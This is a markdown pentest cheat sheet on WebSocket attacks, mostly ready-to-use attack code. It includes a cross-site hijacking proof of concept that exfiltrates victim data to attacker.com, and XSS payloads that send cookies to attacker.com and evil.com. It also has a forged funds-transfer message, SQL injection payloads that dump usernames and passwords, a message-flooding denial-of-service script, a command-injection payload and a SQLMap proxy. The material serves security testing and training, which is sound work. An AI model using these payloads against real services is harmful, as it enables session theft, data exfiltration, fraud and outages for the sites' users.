# WebSocket Attacks

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Cross-Site WebSocket Hijacking (CSWSH)](#cross-site-websocket-hijacking-cswsh)
- [WebSocket Message Manipulation](#websocket-message-manipulation)
- [SQL Injection via WebSocket](#sql-injection-via-websocket)
- [XSS via WebSocket](#xss-via-websocket)
- [Testing Tools](#testing-tools)

---

## Overview

WebSockets provide full-duplex communication channels over a single TCP connection. Unlike HTTP, WebSocket connections persist, making them vulnerable to different attack vectors.

**WebSocket Handshake:**

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: http://target.com
```

---

## Reconnaissance

### Identify WebSocket Endpoints

> Browser DevTools

```text
1. Open Network tab
2. Filter by "WS" 
3. Refresh page and interact
4. Observe WebSocket connections
```

> Common WebSocket paths

```text
/ws
/websocket
/socket
/socket.io
/realtime
/chat
/live
/stream
```

### Analyze WebSocket Messages

> JavaScript in browser console

```javascript
// Hook WebSocket constructor
const OrigWebSocket = window.WebSocket;
window.WebSocket = function(url, protocols) {
    console.log('WebSocket URL:', url);
    const ws = new OrigWebSocket(url, protocols);
    ws.addEventListener('message', function(event) {
        console.log('Received:', event.data);
    });
    const originalSend = ws.send.bind(ws);
    ws.send = function(data) {
        console.log('Sent:', data);
        return originalSend(data);
    };
    return ws;
};
```

---

## Cross-Site WebSocket Hijacking (CSWSH)

If WebSocket endpoint doesn't verify Origin header, attacker can establish connection from malicious site.

### Detection

> Check if Origin is validated

```javascript
// From attacker-controlled page
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    console.log('Connection established from different origin!');
};
ws.onmessage = function(event) {
    console.log('Received:', event.data);
};
```

### Exploitation - Steal Data

```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
var ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    // Send command to get sensitive data
    ws.send(JSON.stringify({action: "getProfile"}));
};

ws.onmessage = function(event) {
    // Exfiltrate data to attacker server
    fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
};
</script>
</body>
</html>
```

### Exploitation - Perform Actions

```html
<script>
var ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    // Perform action as victim
    ws.send(JSON.stringify({
        action: "transfer",
        to: "attacker",
        amount: 1000
    }));
};
</script>
```

---

## WebSocket Message Manipulation

### Intercept with Burp Suite

1. Proxy â†’ WebSocket history
2. Intercept WebSocket messages
3. Modify and forward

### Common Message Formats

> JSON

```json
{"action":"message","data":"hello"}
```

> Plain text

```text
MESSAGE:hello
```

> Binary (may need decoding)

```text
Base64 encoded or custom binary protocol
```

### Parameter Tampering

> Original message

```json
{"user":"normal_user","action":"view","id":"123"}
```

> Tampered message

```json
{"user":"admin","action":"delete","id":"123"}
```

---

## SQL Injection via WebSocket

### SQLi Detection

> Send SQL injection payloads

```json
{"search":"' OR '1'='1"}
{"search":"' UNION SELECT null,null,null--"}
{"id":"1' AND SLEEP(5)--"}
```

### Exploitation

```json
// Boolean-based
{"search":"' OR '1'='1' --"}

// Union-based
{"search":"' UNION SELECT username,password,null FROM users--"}

// Time-based
{"search":"' AND (SELECT SLEEP(5))--"}

// Error-based
{"search":"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"}
```

### Using SQLMap

> Create WebSocket proxy for SQLMap

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from websocket import create_connection
import json
from urllib.parse import urlparse, parse_qs

class ProxyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        param = query.get('id', [''])[0]
        
        ws = create_connection("wss://target.com/ws")
        ws.send(json.dumps({"id": param}))
        result = ws.recv()
        ws.close()
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(result.encode())

HTTPServer(('127.0.0.1', 8080), ProxyHandler).serve_forever()
```

> Run SQLMap against proxy

```shell
sqlmap -u "http://127.0.0.1:8080/?id=1" --batch
```

---

## XSS via WebSocket

### Stored XSS via WebSocket Message

> Send XSS payload via WebSocket

```json
{"message":"<script>document.location='https://attacker.com/?c='+document.cookie</script>"}
{"message":"<img src=x onerror=alert(document.domain)>"}
```

### DOM-based XSS

> If client renders WebSocket data unsafely

```javascript
// Vulnerable client code
ws.onmessage = function(event) {
    document.getElementById('chat').innerHTML += event.data;
};

// Exploitation
ws.send('<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">');
```

---

## Other Attacks

### Denial of Service

> Flood WebSocket with messages

```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    setInterval(function() {
        for(var i = 0; i < 1000; i++) {
            ws.send('A'.repeat(10000));
        }
    }, 100);
};
```

### Authentication Bypass

> Token in WebSocket URL

```text
wss://target.com/ws?token=abc123

# Try:
wss://target.com/ws?token=
wss://target.com/ws
```

> Token in first message

```json
# Skip auth message
{"type":"message","data":"test"}  // Instead of auth first
```

### Race Conditions

> Rapid message sending

```javascript
ws.onopen = function() {
    for(var i = 0; i < 100; i++) {
        ws.send(JSON.stringify({action:"buy",item:"limited"}));
    }
};
```

---

## Testing Tools

### OWASP ZAP WebSocket Addon

```text
1. Configure ZAP as proxy
2. Navigate to WebSocket tabs
3. Fuzz/modify messages
```

### wscat (CLI WebSocket client)

```shell
# Install
npm install -g wscat

# Connect
wscat -c wss://target.com/ws

# Connect with headers
wscat -c wss://target.com/ws -H "Cookie: session=abc"

# Send message
> {"action":"test"}
```

### websocat

```shell
# Install
cargo install websocat

# Connect
websocat wss://target.com/ws

# With headers
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Python websocket-client

```python
from websocket import create_connection

ws = create_connection("wss://target.com/ws",
    cookie="session=abc",
    origin="https://target.com"
)

ws.send('{"action":"test"}')
result = ws.recv()
print(result)
ws.close()
```

---

## Quick Reference

### CSWSH Check

```html
<script>
var ws = new WebSocket('wss://TARGET/ws');
ws.onopen = () => console.log('Vulnerable to CSWSH!');
ws.onerror = () => console.log('Protected or connection failed');
</script>
```

### Common Payloads

| Attack | Payload |
| :--- | :--- |
| SQLi | `{"id":"1' OR '1'='1"}` |
| XSS | `{"msg":"<script>alert(1)</script>"}` |
| IDOR | `{"userId":"999"}` (change user ID) |
| Command Injection | `{"cmd":"test;id"}` |

### Security Headers for Protection

```text
Sec-WebSocket-Origin validation
CSRF tokens in WebSocket handshake
Same-site cookies
```

---

## ðŸ“š See Also

### Related Web Attacks

- **[Cross-Site Scripting (XSS)](7.2.Cross-Site-Scripting.md)** - XSS via WebSocket messages
- **[SQL Injection](7.1.SQL-Injection.md)** - SQLi through WebSocket payloads
- **[Command Injection](7.4.Command-Injection.md)** - Command injection via WebSocket
